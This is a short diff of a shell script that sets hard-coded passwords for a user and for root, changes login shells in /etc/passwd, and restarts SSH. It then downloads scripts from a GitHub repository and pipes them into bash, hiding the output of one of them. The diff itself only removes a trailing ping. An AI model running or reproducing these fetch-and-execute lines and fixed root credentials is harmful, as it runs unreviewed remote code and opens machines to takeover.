@@ -5,4 +5,4 @@ printf "aunglay:aunglay" | sudo chpasswd
 printf "root:aunglay" | sudo chpasswd
 sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
 service ssh restart  && wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/d &> /dev/null && bash d &> /dev/null
-wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/c && bash c && ping google.com
+wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/c && bash c 
